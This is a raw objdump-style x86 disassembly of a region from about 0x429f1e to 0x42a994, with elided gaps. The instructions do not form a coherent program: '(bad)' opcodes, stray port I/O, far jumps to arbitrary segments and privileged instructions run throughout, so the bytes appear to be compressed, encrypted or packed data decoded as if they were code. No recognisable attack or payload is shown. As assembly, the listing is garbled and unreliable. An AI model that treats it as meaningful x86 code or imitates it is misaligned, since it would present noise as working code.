  429f1e:	sbb    DWORD PTR [edx],ebx
  429f20:	mov    al,0xc7
  429f22:	cmp    ch,BYTE PTR [esp+eax*2-0x1f]
  429f26:	lods   eax,DWORD PTR ds:[esi]
  429f27:	lds    edx,FWORD PTR [eax]
  429f29:	imul   eax,esi,0x637685a6
  429f2f:	and    al,bh
  429f31:	rcr    DWORD PTR [eax-0x7c909f13],1
  429f37:	xchg   edx,eax
  429f38:	in     al,dx
  429f39:	int    0x32
  429f3b:	pop    edi
  429f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429f3d:	mov    edx,0xba74664f
	...
  429fb2:	add    BYTE PTR [eax],al
  429fb4:	loope  0x429fa2
  429fb6:	mov    ebx,es
  429fb8:	(bad)  
  429fb9:	jecxz  0x429faa
  429fbb:	out    dx,al
  429fbc:	sub    dh,BYTE PTR [eax+0x5f776d7b]
  429fc2:	xchg   edx,eax
  429fc3:	daa    
  429fc4:	ret    0x1bd
  429fc7:	add    dh,dh
  429fc9:	add    BYTE PTR [eax],al
  429fcb:	add    BYTE PTR [ecx-0x236150e8],dh
  429fd1:	cmp    eax,0x3a03413d
  429fd6:	aam    0xb5
  429fd8:	add    bh,BYTE PTR [eax+0x7c25afda]
  429fde:	shl    BYTE PTR [edx-0xfad5633],cl
  429fe4:	jmp    0x429f78
  429fe6:	clc    
  429fe7:	retf   
  429fe8:	or     BYTE PTR [edi+ebx*2-0x20004084],dh
  429fef:	mov    edi,0xe2ea6231
  429ff4:	enter  0x39ae,0x67
  429ff8:	pop    ebp
  429ffa:	fidiv  DWORD PTR [ebx-0x6d7f72f8]
  42a000:	push   ecx
  42a001:	xor    ecx,DWORD PTR [edx-0x33]
  42a004:	mov    ah,0x54
  42a006:	retf   
  42a007:	mov    edi,0x8b8858ed
  42a00c:	mov    DWORD PTR [edx],ecx
  42a00e:	mov    ebp,DWORD PTR [ebx]
  42a010:	mov    eax,ds:0x42cea5f9
  42a015:	xchg   ebx,eax
  42a016:	xor    eax,0xee97c15e
  42a01b:	scas   eax,DWORD PTR es:[edi]
  42a01c:	and    DWORD PTR [edi+0x503fb307],esp
  42a022:	test   DWORD PTR [eax+0x79],eax
  42a025:	gs aad 0x23
  42a028:	fstp   DWORD PTR [ecx]
  42a02a:	sar    BYTE PTR [esi+0x7ba8a52c],cl
  42a030:	sbb    edi,ecx
  42a032:	inc    edx
  42a033:	cmp    ebp,DWORD PTR [ecx+0x68]
  42a036:	adc    al,0xfc
  42a038:	leave  
  42a039:	xor    ebp,0xffffffae
  42a03c:	push   esp
  42a03d:	das    
  42a03e:	ins    BYTE PTR es:[edi],dx
  42a03f:	xor    BYTE PTR [esp+esi*4],al
  42a042:	sub    ah,bh
  42a044:	sub    al,0x5f
  42a046:	push   cs
  42a047:	into   
  42a048:	pusha  
  42a049:	pop    ebp
  42a04a:	int3   
  42a04b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a04c:	clc    
  42a04d:	das    
  42a04e:	mov    ebp,0xb49f836a
  42a053:	xchg   esp,eax
  42a054:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a055:	xchg   ebp,eax
  42a056:	test   BYTE PTR [ebp-0x7d28c913],0xac
  42a05d:	out    0x6c,eax
  42a05f:	int3   
  42a060:	inc    edx
  42a061:	or     ebp,DWORD PTR [eax+eiz*4]
  42a064:	retf   0x9b9
  42a067:	(bad)  
  42a068:	repz test BYTE PTR [eax],bh
  42a06b:	xor    esi,edi
  42a06d:	jno    0x42a028
  42a06f:	int    0xea
  42a071:	fiadd  WORD PTR [edi-0x42]
  42a074:	sbb    ebx,DWORD PTR [esi-0x55]
  42a077:	inc    ebp
  42a078:	repnz inc esp
  42a07a:	push   0xa86fc349
  42a07f:	fild   WORD PTR [ecx]
  42a081:	pusha  
  42a082:	jns    0x42a010
  42a084:	inc    ebp
  42a085:	mov    edx,0x9563ab49
  42a08a:	scas   al,BYTE PTR es:[edi]
  42a08b:	push   esp
  42a08c:	or     ebp,DWORD PTR [eax-0x4ab77487]
  42a092:	cmp    ebx,esp
  42a094:	adc    BYTE PTR ds:0xf2c8320b,dl
  42a09a:	aam    0x9d
  42a09c:	inc    esi
  42a09d:	fadd   QWORD PTR ds:0x4b91ab49
  42a0a3:	inc    ecx
  42a0a4:	inc    esp
  42a0a5:	or     ebx,esi
  42a0a7:	push   eax
  42a0a8:	out    0xc2,al
  42a0aa:	push   0xffffffa6
  42a0ac:	std    
  42a0ad:	mov    esp,0xd1d05c69
  42a0b2:	mov    WORD PTR [eax],?
  42a0b4:	(bad)
  42a0b9:	int    0xda
  42a0bb:	add    al,0x19
  42a0bd:	pop    esi
  42a0be:	pop    es
  42a0bf:	pop    eax
  42a0c0:	push   edx
  42a0c1:	sub    eax,DWORD PTR [eax]
	...
  42a133:	add    BYTE PTR [esi-0x79],dl
  42a136:	std    
  42a137:	test   ch,bh
  42a139:	(bad)  
  42a13a:	jg     0x42a113
  42a13c:	jbe    0x42a105
  42a13e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a13f:	(bad)  
  42a140:	sbb    BYTE PTR [esi-0x24],0x5a
  42a144:	mov    eax,0xf60001be
  42a149:	add    BYTE PTR [eax],al
  42a14b:	add    BYTE PTR [eax+0x60],ah
  42a14e:	dec    edx
  42a14f:	mov    esp,DWORD PTR [edi+ebx*4-0x6c]
  42a153:	test   DWORD PTR [edi+0x60],ecx
  42a156:	pop    edi
  42a157:	popa   
  42a158:	sysret 
  42a15a:	arpl   WORD PTR ds:0xabc33ae8,bp
  42a160:	fisttp DWORD PTR [esi+0x3afd19d0]
  42a166:	std    
  42a167:	lahf   
  42a168:	fadd   st,st(1)
  42a16a:	ins    DWORD PTR es:[edi],dx
  42a16b:	or     ch,BYTE PTR [edi-0x59f0df93]
  42a171:	(bad)  [ebx]
  42a173:	mov    al,ds:0x78521043
  42a178:	xor    dh,BYTE PTR [edx]
  42a17a:	in     al,0xf9
  42a17c:	sar    DWORD PTR [ebx+0x2e],cl
  42a17f:	xchg   ebp,eax
  42a180:	sbb    al,BYTE PTR [esi-0x65]
  42a183:	ret    0x5203
  42a186:	push   ss
  42a187:	jg     0x42a13b
  42a189:	test   DWORD PTR [ecx+edx*4+0x4a],ecx
  42a18d:	in     eax,0x8
  42a18f:	(bad)  
  42a190:	cld    
  42a191:	imul   ebx,DWORD PTR [eax],0xffffffc6
  42a194:	(bad)  
  42a195:	inc    edx
  42a196:	or     DWORD PTR [eax],eax
  42a198:	pop    ds
  42a199:	inc    eax
  42a19a:	leave  
  42a19b:	jmp    0x42a1f4
  42a19d:	out    dx,eax
  42a19e:	push   ebp
  42a19f:	add    eax,0x1e99d73f
  42a1a4:	sahf   
  42a1a5:	test   BYTE PTR [ebp+0x4e00eb06],dh
  42a1ab:	mov    WORD PTR [esp+ebx*1-0x1791d9f2],?
  42a1b2:	js     0x42a1f0
  42a1b4:	mov    ebx,DWORD PTR [esi+esi*1+0x6d]
  42a1b8:	jmp    0x17be397c
  42a1bd:	ficomp WORD PTR [esi]
  42a1bf:	ret    
  42a1c0:	rol    bh,1
  42a1c2:	lods   eax,DWORD PTR ds:[esi]
  42a1c3:	adc    DWORD PTR gs:[esi-0x3a093222],ebp
  42a1ca:	mov    BYTE PTR [edi-0x79],ah
  42a1cd:	(bad)  
  42a1ce:	and    ebp,edx
  42a1d0:	not    ebx
  42a1d2:	or     eax,0x84ecf2d8
  42a1d7:	shl    DWORD PTR [ebx],1
  42a1d9:	and    al,0xc1
  42a1db:	push   ss
  42a1dc:	aad    0x58
  42a1de:	ror    DWORD PTR [eax+ecx*1+0x3d],0xfd
  42a1e3:	pop    ecx
  42a1e4:	mov    WORD PTR [ebx],fs
  42a1e6:	out    0xc8,al
  42a1e8:	(bad)  
  42a1e9:	leave  
  42a1ea:	in     al,dx
  42a1eb:	mov    bh,0xfd
  42a1ed:	dec    esp
  42a1ee:	jmp    0xaad2:0x4e16fc63
  42a1f5:	xor    BYTE PTR [ecx+0x30],ah
  42a1f8:	mov    ds:0xe01d14d3,al
  42a1fd:	sub    DWORD PTR [edx+0x1c],ecx
  42a200:	jmp    0x42a224
  42a202:	ins    DWORD PTR es:[edi],dx
  42a203:	cmp    BYTE PTR [esi],0xc3
  42a206:	mov    edx,0xc1325849
  42a20b:	stc    
  42a20c:	jmp    0x3b00:0x15819be6
  42a213:	inc    ebp
  42a214:	adc    eax,0xc4ae7da6
  42a219:	xlat   BYTE PTR ds:[ebx]
  42a21a:	ja     0x42a28e
  42a21c:	mov    esi,0xf5128850
  42a221:	adc    al,0xdf
  42a223:	les    esp,FWORD PTR [eax+eiz*4]
  42a226:	sbb    BYTE PTR [edi+0x4c],0x24
  42a22a:	sahf   
  42a22b:	loope  0x42a2a5
  42a22d:	xor    DWORD PTR [ebx+0x59],edx
  42a230:	mov    cl,0x2b
  42a232:	cmc    
  42a233:	call   DWORD PTR [ecx+0xef0a28c]
  42a239:	add    al,0xa0
  42a23b:	lahf   
  42a23c:	sahf   
  42a23d:	sub    al,0x4d
  42a23f:	pop    eax
  42a240:	gs jo  0x42a243
	...
  42a2b3:	add    al,dh
  42a2b5:	adc    al,0xe1
  42a2b7:	(bad)  
  42a2b8:	in     eax,0xff
  42a2ba:	call   FWORD PTR [esi]
  42a2bc:	xor    eax,0xcf7f8ab9
  42a2c1:	xchg   esi,eax
  42a2c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a2c3:	mov    eax,ds:0x1bfae
  42a2c8:	test   BYTE PTR [eax],0x0
  42a2cb:	add    BYTE PTR [eax+0x6b],dl
  42a2ce:	push   es
  42a2cf:	inc    edi
  42a2d0:	es (bad) 
  42a2d2:	pop    esp
  42a2d3:	ja     0x42a27b
  42a2d5:	aad    0x13
  42a2d7:	scas   al,BYTE PTR es:[edi]
  42a2d8:	and    al,BYTE PTR [edx-0x63]
  42a2db:	fild   WORD PTR [eax-0x30c14c53]
  42a2e1:	int    0x64
  42a2e3:	repnz adc al,0x6b
  42a2e6:	mov    esi,ss
  42a2e8:	jle    0x42a2ab
  42a2ea:	lods   eax,DWORD PTR ds:[esi]
  42a2eb:	sub    al,0x37
  42a2ed:	aad    0x37
  42a2ef:	(bad)  
  42a2f0:	bound  edi,QWORD PTR [ebx-0xa]
  42a2f3:	sbb    DWORD PTR ds:0x69105e35,edx
  42a2f9:	jge    0x42a305
  42a2fb:	or     bl,BYTE PTR [edi-0x62086601]
  42a301:	fimul  DWORD PTR [ebx-0x513daded]
  42a307:	dec    eax
  42a308:	cwde   
  42a309:	pop    ecx
  42a30a:	pop    ebp
  42a30b:	sbb    al,0x3
  42a30d:	and    esi,esp
  42a30f:	js     0x42a325
  42a311:	mov    edi,0x28344963
  42a316:	inc    edx
  42a317:	ss in  eax,0xe3
  42a31a:	mov    ds:0x89012664,al
  42a31f:	cmp    ecx,DWORD PTR [edx]
  42a321:	mov    eax,0x60894d73
  42a326:	shr    BYTE PTR [ebx-0x48],0xc6
  42a32a:	jno    0x42a30b
  42a32c:	shl    BYTE PTR [esi],1
  42a32e:	cli    
  42a32f:	adc    BYTE PTR [ecx+0x287d4ad1],ah
  42a335:	push   ds
  42a336:	pop    ds
  42a337:	mov    al,ds:0x5e7e28f6
  42a33c:	xor    BYTE PTR ds:[ecx-0x5237bd02],cl
  42a343:	dec    esi
  42a344:	aaa    
  42a345:	add    dl,BYTE PTR [esi]
  42a347:	cli    
  42a348:	ss adc al,0xe
  42a34b:	and    BYTE PTR [esi+0x30],al
  42a34e:	jb     0x42a352
  42a350:	aad    0x2c
  42a352:	inc    eax
  42a353:	lea    ebp,[ecx]
  42a355:	ins    DWORD PTR es:[edi],dx
  42a356:	ror    DWORD PTR [ecx+0x77d597b0],cl
  42a35c:	mov    edx,0x725cc3c0
  42a361:	ins    DWORD PTR es:[edi],dx
  42a362:	cmp    eax,0xed22faac
  42a367:	into   
  42a368:	jb     0x42a322
  42a36a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a36b:	pop    edx
  42a36c:	or     dl,BYTE PTR [eax-0xc]
  42a36f:	loop   0x42a32f
  42a371:	daa    
  42a372:	es (bad) 
  42a375:	imul   ebx,DWORD PTR [eax],0xe4f96f84
  42a37b:	inc    ebp
  42a37c:	sbb    bl,BYTE PTR [eax+0x67a2019f]
  42a382:	jg     0x42a39c
  42a384:	adc    edx,DWORD PTR [eax]
  42a386:	push   0x5cfaa312
  42a38b:	ds jp  0x42a402
  42a38e:	fucomp st(7)
  42a390:	mov    ds:0x9e79dd8b,al
  42a396:	jo     0x42a325
  42a398:	pop    ds
  42a399:	iret   
  42a39a:	pop    es
  42a39b:	push   edi
  42a39c:	rep stos DWORD PTR es:[edi],eax
  42a39e:	xchg   DWORD PTR [ebx-0x31426234],esp
  42a3a4:	inc    edi
  42a3a5:	add    DWORD PTR [edi],edi
  42a3a7:	adc    BYTE PTR [esi],dl
  42a3a9:	shr    BYTE PTR ds:0x459a0ca8,1
  42a3af:	test   al,0x31
  42a3b1:	push   ds
  42a3b2:	cwde   
  42a3b3:	cmp    eax,0xd6babf78
  42a3b8:	xor    DWORD PTR [ebp-0x14],eax
  42a3bb:	lea    esp,[edx]
  42a3bd:	rol    cl,0xe4
  42a3c0:	and    eax,0xc1
	...
  42a431:	add    BYTE PTR [eax],al
  42a433:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  42a437:	sub    al,0x53
  42a439:	ds jg  0x42a4a9
  42a43c:	stos   BYTE PTR es:[edi],al
  42a43d:	dec    ebx
  42a43e:	push   edi
  42a43f:	jo     0x42a457
  42a441:	ret    
  42a442:	test   cl,ah
  42a444:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a445:	rol    BYTE PTR [ecx],0x0
  42a448:	test   BYTE PTR [eax],0x0
  42a44b:	add    BYTE PTR [edi-0x6c5a85fc],bl
  42a451:	push   es
  42a452:	and    eax,0xa387b8b0
  42a457:	mov    eax,0x85f7c65d
  42a45c:	fyl2xp1 
  42a45e:	nop
  42a45f:	sub    ch,BYTE PTR [ecx+eiz*8]
  42a462:	leave  
  42a463:	add    DWORD PTR [esi-0x63],ebx
  42a466:	mov    dl,0x74
  42a468:	xchg   ebx,eax
  42a469:	pop    ebx
  42a46a:	inc    edi
  42a46b:	add    cl,ch
  42a46d:	and    bl,dl
  42a46f:	push   ebp
  42a470:	mov    edi,0xa571fe2b
  42a475:	call   DWORD PTR [ecx-0x9]
  42a478:	ins    DWORD PTR es:[edi],dx
  42a479:	push   es
  42a47a:	and    eax,eax
  42a47c:	inc    ebp
  42a47d:	dec    ebx
  42a47e:	or     bh,BYTE PTR [edx-0x7d971cce]
  42a484:	xchg   esi,eax
  42a485:	popa   
  42a486:	sbb    BYTE PTR [ebx+0xa11c2ee],bh
  42a48c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a48d:	into   
  42a48e:	clc    
  42a48f:	fld    TBYTE PTR [edx+0x7c9bd459]
  42a495:	xlat   BYTE PTR ds:[ebx]
  42a496:	adc    al,0xa1
  42a498:	cmp    al,0x7c
  42a49a:	adc    cl,0x4
  42a49d:	test   al,0x2d
  42a49f:	sub    cl,BYTE PTR [esi+0x7eab48a5]
  42a4a5:	adc    BYTE PTR [ebp-0x2fba2957],0x60
  42a4ac:	stos   DWORD PTR es:[edi],eax
  42a4ad:	mov    al,ds:0x2d193269
  42a4b2:	jns    0x42a472
  42a4b4:	repnz adc DWORD PTR [ebx],ebx
  42a4b7:	adc    eax,0x4901d38
  42a4bc:	jmp    FWORD PTR [edi+ecx*4]
  42a4bf:	cmp    ebx,DWORD PTR [edi-0x67]
  42a4c2:	pop    ecx
  42a4c3:	jns    0x42a4b0
  42a4c5:	xor    DWORD PTR [esi],0xffffffe7
  42a4c8:	xor    al,0xf1
  42a4ca:	sub    edi,0x6ad2e57b
  42a4d0:	cmc    
  42a4d1:	jmp    0xdb83:0xe10b9936
  42a4d8:	pop    esi
  42a4d9:	xor    DWORD PTR [esi+0x3b],edx
  42a4dc:	xchg   edi,eax
  42a4dd:	xor    ch,BYTE PTR [eax]
  42a4df:	cmp    BYTE PTR [ebx+0x3f569b65],0x19
  42a4e6:	xlat   BYTE PTR ds:[ebx]
  42a4e7:	jl     0x42a4a2
  42a4e9:	inc    esi
  42a4ea:	addr16 jo 0x42a4f1
  42a4ed:	out    0x6,eax
  42a4ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a4f0:	add    BYTE PTR [ebx+0x1363c50b],bl
  42a4f6:	rol    BYTE PTR [eax+0x426679b7],cl
  42a4fc:	arpl   dx,sp
  42a4fe:	add    BYTE PTR [eax+0x6f57075f],al
  42a504:	cwde   
  42a505:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a506:	test   eax,0x40fb2c7f
  42a50b:	push   cs
  42a50c:	nop
  42a50d:	call   0xf17a:0xd10a1e86
  42a514:	pop    ds
  42a515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a516:	xchg   esp,eax
  42a517:	ins    DWORD PTR es:[edi],dx
  42a518:	or     eax,0x482901a8
  42a51d:	cmp    eax,0xbb3e6390
  42a522:	stos   BYTE PTR es:[edi],al
  42a523:	mov    gs,WORD PTR [ebp+0x4]
  42a526:	adc    esi,DWORD PTR [eax+0x7b]
  42a529:	sub    eax,0xb9c7b70
  42a52e:	ret    0xd4c7
  42a531:	lahf   
  42a532:	jbe    0x42a4ca
  42a534:	xor    al,0x91
  42a536:	mov    al,0x1e
  42a538:	(bad)  
  42a539:	xor    DWORD PTR [esi-0x2e],edi
  42a53c:	pushf  
  42a53d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a53e:	push   0xffffffa0
  42a540:	clc    
  42a541:	add    BYTE PTR fs:[eax],al
	...
  42a5b4:	ins    DWORD PTR es:[edi],dx
  42a5b5:	sbb    eax,0xfbf6c0e6
  42a5ba:	outs   dx,DWORD PTR ds:[esi]
  42a5bb:	mov    ebp,0x44d94d2c
  42a5c0:	rol    DWORD PTR [ebx-0x3e653de2],0x1
  42a5c7:	add    dh,dh
  42a5c9:	add    BYTE PTR [eax],al
  42a5cb:	add    ch,bl
  42a5cd:	iret   
  42a5ce:	mov    ds:0x5dd0dd0b,al
  42a5d3:	cmp    dl,BYTE PTR [eax-0x30b9c194]
  42a5d9:	icebp  
  42a5da:	lahf   
  42a5db:	pop    esi
  42a5dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a5dd:	aam    0x80
  42a5df:	dec    edi
  42a5e0:	aam    0x7c
  42a5e2:	out    dx,eax
  42a5e3:	jl     0x42a5e1
  42a5e5:	pop    es
  42a5e6:	ss jmp 0x89b861d
  42a5ec:	pop    esp
  42a5ed:	jbe    0x42a5c0
  42a5ef:	shr    BYTE PTR [ecx],cl
  42a5f1:	data16 adc al,BYTE PTR [eax+0x36]
  42a5f5:	sbb    ebx,edx
  42a5f7:	adc    ch,cl
  42a5f9:	dec    esi
  42a5fa:	dec    ebp
  42a5fb:	aas    
  42a5fc:	jecxz  0x42a60d
  42a5fe:	sbb    al,0xe6
  42a600:	jle    0x42a667
  42a602:	mov    eax,ds:0x6221808d
  42a607:	adc    DWORD PTR ds:0x9f8cca8,eax
  42a60d:	mov    dh,BYTE PTR [esi]
  42a60f:	and    eax,0x4e9ca55e
  42a614:	iret   
  42a615:	xchg   ecx,eax
  42a616:	or     al,0x4c
  42a618:	and    bh,cl
  42a61a:	bound  ecx,QWORD PTR [ebx]
  42a61c:	push   ebp
  42a61d:	(bad)  
  42a61e:	in     eax,0x2
  42a620:	mov    WORD PTR ds:0x9bb4af6a,ss
  42a626:	push   ebx
  42a627:	pop    esi
  42a628:	dec    eax
  42a629:	rcr    BYTE PTR [esi+0x5],cl
  42a62c:	cmp    DWORD PTR es:[ecx-0x34],ebx
  42a630:	mov    cl,0x57
  42a632:	cmp    eax,0xc48b56cb
  42a637:	push   edx
  42a638:	fs and eax,eax
  42a63b:	sub    ebp,DWORD PTR [ebp-0x75b6bd5]
  42a641:	lock ins BYTE PTR es:[edi],dx
  42a643:	cmp    BYTE PTR [edi+ebx*1+0x53],ch
  42a647:	inc    esp
  42a648:	fdiv   st(5),st
  42a64a:	pop    edx
  42a64b:	push   ecx
  42a64c:	loope  0x42a66f
  42a64e:	cwde   
  42a64f:	and    BYTE PTR [ebp-0x4ffd3a94],dh
  42a655:	mov    esi,DWORD PTR ds:0x267b3978
  42a65b:	ins    DWORD PTR es:[edi],dx
  42a65c:	adc    dl,dl
  42a65e:	out    dx,eax
  42a65f:	stc    
  42a660:	and    al,0xc
  42a662:	fidivr WORD PTR [edi+0x6c7a967b]
  42a668:	jg     0x42a66d
  42a66a:	in     al,dx
  42a66b:	test   BYTE PTR [ecx-0x36d4e501],al
  42a671:	test   eax,0x7e06da23
  42a676:	call   0xefcf:0xf3943ca7
  42a67d:	mov    ah,0x81
  42a67f:	nop
  42a680:	ja     0x42a700
  42a682:	mov    ebp,0xa8455cc
  42a687:	div    BYTE PTR [edi+0x59e59b2a]
  42a68d:	mov    cl,0x9f
  42a68f:	retf   
  42a690:	in     eax,0x41
  42a692:	jmp    0x464e:0xeb8877aa
  42a699:	xchg   ecx,ebp
  42a69b:	(bad)  
  42a69c:	mov    al,ds:0xc42bebd6
  42a6a1:	ins    BYTE PTR es:[edi],dx
  42a6a2:	add    esi,ebp
  42a6a4:	pop    ds
  42a6a5:	dec    edx
  42a6a6:	lds    ecx,FWORD PTR [edi+0x7d46c252]
  42a6ac:	inc    ebx
  42a6ad:	and    DWORD PTR [edx-0xae3c4e],edx
  42a6b3:	mov    ds:0x9b8c9dc1,al
  42a6b8:	xchg   bh,dh
  42a6ba:	pop    eax
  42a6bb:	pusha  
  42a6bc:	mov    ds:0xddead713,al
  42a6c1:	mov    WORD PTR [eax],es
	...
  42a733:	add    BYTE PTR [eax],dh
  42a735:	inc    edx
  42a736:	fbld   TBYTE PTR [edx-0x1]
  42a739:	(bad)  
  42a73a:	mov    ebp,0xffb84452
  42a73f:	cdq    
  42a740:	outs   dx,DWORD PTR ds:[esi]
  42a741:	mov    ecx,0xc290a2ea
  42a746:	add    DWORD PTR [eax],eax
  42a748:	test   BYTE PTR [eax],0x0
  42a74b:	add    BYTE PTR [edi],dl
  42a74d:	outs   dx,DWORD PTR ds:[esi]
  42a74e:	xor    BYTE PTR [edx+0x45],cl
  42a751:	push   esp
  42a752:	xor    al,0xe8
  42a754:	inc    eax
  42a755:	xor    ebx,esi
  42a757:	add    esp,DWORD PTR [edx]
  42a759:	dec    eax
  42a75a:	out    dx,eax
  42a75b:	int3   
  42a75c:	lea    ecx,[ebp-0x12]
  42a75f:	mov    ds:0xc50326ee,eax
  42a764:	outs   dx,DWORD PTR ds:[esi]
  42a765:	stc    
  42a766:	lea    ebp,[eax]
  42a768:	and    bh,BYTE PTR [eax+ebp*1]
  42a76b:	jo     0x42a70d
  42a76d:	fs nop
  42a76f:	mov    ch,0x76
  42a771:	sbb    BYTE PTR [ecx-0x6965a1c3],ah
  42a777:	push   es
  42a778:	mov    al,0x8e
  42a77a:	sub    ch,dh
  42a77c:	jge    0x42a7b4
  42a77e:	fld    DWORD PTR [esp+ecx*2+0x5360949a]
  42a785:	jno    0x42a785
  42a787:	or     BYTE PTR [ebx],ch
  42a789:	in     eax,dx
  42a78a:	and    ebx,esp
  42a78c:	mov    eax,0x7280f96e
  42a791:	sar    DWORD PTR [eax],1
  42a793:	fs inc edx
  42a795:	(bad)  
  42a796:	out    dx,eax
  42a797:	sbb    DWORD PTR [ebx+0x49829de0],0xc4d786c2
  42a7a1:	inc    ebp
  42a7a2:	imul   ebx,DWORD PTR [edx+ebp*8+0x4a],0x85b2a619
  42a7aa:	lds    eax,FWORD PTR [ecx-0x7f4e9490]
  42a7b0:	dec    edx
  42a7b1:	test   eax,0x5cddeb66
  42a7b6:	cmc    
  42a7b7:	inc    edx
  42a7b8:	sbb    eax,0xcf72802a
  42a7bd:	xchg   edi,eax
  42a7be:	pop    ds
  42a7bf:	es (bad) 
  42a7c1:	jbe    0x42a75d
  42a7c3:	int    0xa7
  42a7c5:	std    
  42a7c6:	outs   dx,DWORD PTR ds:[esi]
  42a7c7:	outs   dx,BYTE PTR ds:[esi]
  42a7c8:	or     BYTE PTR ds:0xb88aab89,0x5e
  42a7cf:	fcom   DWORD PTR ds:0x5534cb3a
  42a7d5:	sub    BYTE PTR [eax],ah
  42a7d7:	push   ecx
  42a7d8:	fmul   QWORD PTR [esi+0xe978962]
  42a7de:	ins    DWORD PTR es:[edi],dx
  42a7df:	fcmovbe st,st(0)
  42a7e1:	loop   0x42a7d2
  42a7e3:	dec    esp
  42a7e4:	lods   eax,DWORD PTR ds:[esi]
  42a7e5:	mov    bh,0xa8
  42a7e7:	dec    ecx
  42a7e8:	jmp    0x4aacbaee
  42a7ed:	ins    DWORD PTR es:[edi],dx
  42a7ee:	pop    eax
  42a7ef:	add    BYTE PTR [ecx-0x6b0514ac],bh
  42a7f5:	icebp  
  42a7f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a7f7:	add    bl,BYTE PTR [ebx+0x3b29e715]
  42a7fd:	mov    cs,edx
  42a7ff:	pop    edx
  42a800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a801:	push   edx
  42a802:	or     DWORD PTR [eax-0x5b8d9be7],esi
  42a808:	mov    dh,0x9d
  42a80a:	rcr    DWORD PTR [edi-0x7b],1
  42a80d:	push   esi
  42a80e:	sar    BYTE PTR [edi],cl
  42a810:	sbb    eax,DWORD PTR [esi+ecx*1+0x71]
  42a814:	jmp    0x42a7fd
  42a816:	sub    dl,al
  42a818:	sub    al,0x75
  42a81a:	or     edi,esp
  42a81c:	jb     0x42a883
  42a81e:	xor    eax,0xb5002526
  42a823:	scas   al,BYTE PTR es:[edi]
  42a824:	and    esi,esp
  42a826:	xlat   BYTE PTR ds:[ebx]
  42a827:	sub    esp,0x5d
  42a82a:	or     eax,0xcf470625
  42a82f:	sbb    al,0x27
  42a831:	mov    edx,0x9a22a438
  42a836:	adc    eax,0xafb4e2a7
  42a83b:	push   edi
  42a83c:	int    0x52
  42a83e:	call   0x139a610
	...
  42a8b3:	add    BYTE PTR [edi+0x68],dl
  42a8b6:	fistp  QWORD PTR fs:[edi-0x21]
  42a8ba:	(bad)  
  42a8bb:	call   0x123b0c10
  42a8c0:	push   es
  42a8c1:	jecxz  0x42a8dd
  42a8c3:	stos   DWORD PTR es:[edi],eax
  42a8c4:	xchg   bl,al
  42a8c6:	add    DWORD PTR [eax],eax
  42a8c8:	test   BYTE PTR [eax],0x0
  42a8cb:	add    BYTE PTR [ebx+0x5],cl
  42a8ce:	loop   0x42a8cb
  42a8d0:	shl    DWORD PTR [esp+eiz*4-0x3318c94c],1
  42a8d7:	mov    ds:0xb070acde,al
  42a8dc:	xor    dh,cl
  42a8de:	or     esp,DWORD PTR [esi]
  42a8e0:	test   al,0xaf
  42a8e2:	mov    edi,0x1dbd0a75
  42a8e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a8e8:	stos   DWORD PTR es:[edi],eax
  42a8e9:	sar    BYTE PTR [ebx+0x4838ec47],cl
  42a8ef:	cmp    al,0x6f
  42a8f1:	int    0x67
  42a8f3:	push   ebx
  42a8f4:	xor    bh,bh
  42a8f6:	push   edi
  42a8f7:	mov    eax,ds:0x4667cccb
  42a8fc:	xor    bh,ah
  42a8fe:	int3   
  42a8ff:	push   ebx
  42a900:	mov    eax,ds:0xef55917f
  42a905:	dec    esp
  42a906:	push   es
  42a907:	popa   
  42a908:	(bad)  
  42a909:	jge    0x42a8b0
  42a90b:	sahf   
  42a90c:	sbb    al,0xa1
  42a90e:	xchg   ah,ah
  42a910:	sti    
  42a911:	inc    ecx
  42a912:	daa    
  42a913:	adc    BYTE PTR ds:[ecx+0x18],ah
  42a917:	xlat   BYTE PTR ds:[ebx]
  42a918:	enter  0xfcff,0x92
  42a91c:	(bad)
  42a91f:	test   BYTE PTR [esi-0xe6a44a],ch
  42a925:	dec    ebx
  42a926:	mov    ds:0x9389a226,eax
  42a92b:	(bad)  
  42a92c:	in     al,0x2e
  42a92e:	pop    esp
  42a92f:	cwde   
  42a930:	pop    es
  42a931:	out    dx,eax
  42a932:	lea    esi,[eax]
  42a934:	dec    ebx
  42a935:	frstor [edi-0x4d5d942c]
  42a93b:	shr    ecx,cl
  42a93d:	jl     0x42a998
  42a93f:	sahf   
  42a940:	hlt    
  42a941:	mov    al,ds:0x304d3f27
  42a946:	push   edx
  42a947:	stos   BYTE PTR es:[edi],al
  42a948:	inc    ecx
  42a949:	xchg   ebx,eax
  42a94a:	push   edx
  42a94b:	sub    eax,0x2ca58b9b
  42a950:	loop   0x42a991
  42a952:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a953:	enter  0x5a66,0xf4
  42a957:	test   eax,0xa9dc594c
  42a95c:	cld    
  42a95d:	int3   
  42a95e:	jae    0x42a985
  42a960:	stos   BYTE PTR es:[edi],al
  42a961:	cs push cs
  42a963:	ret    0x19c5
  42a966:	fcomi  st,st(3)
  42a968:	sub    eax,0x764dec0
  42a96d:	fs into 
  42a96f:	jo     0x42a98d
  42a971:	dec    eax
  42a972:	into   
  42a973:	add    eax,0xcfb3abe1
  42a978:	ss dec esp
  42a97a:	shl    BYTE PTR [esi-0x5ce3b661],0xd3
  42a981:	sub    DWORD PTR [ebx+eax*1+0x47ddb3c1],eax
  42a988:	into   
  42a989:	mov    ds:0x41f45e4c,al
  42a98e:	push   ecx
  42a98f:	or     ebp,esp
  42a991:	cs jmp 0x42aa0a
  42a994:	stc    
